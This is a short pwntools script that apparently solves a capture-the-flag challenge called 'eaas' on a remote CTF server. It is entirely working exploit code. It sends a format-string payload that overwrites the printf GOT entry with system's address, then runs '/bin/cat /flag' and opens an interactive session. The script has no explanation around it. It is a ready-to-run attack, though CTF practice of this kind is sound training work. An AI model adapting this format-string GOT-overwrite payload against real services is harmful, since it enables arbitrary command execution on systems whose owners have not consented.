from pwn import *

context.arch = 'amd64'

elf = context.binary = ELF('./eaas')
p = remote('nc.ctf.unitedctf.ca', 4003)

# offset = 10
# printf = 0x402010
# overwrite 0x402010 (printf) with 0x400640 (system)

p.sendline(b'%1600c%13$lln%14$hhnaaaa\x10 @\x00\x00\x00\x00\x00\x12 @\x00\x00\x00\x00\x00')

info('sending /bin/cat /flag')
p.sendline(b'/bin/cat /flag')

p.interactive()

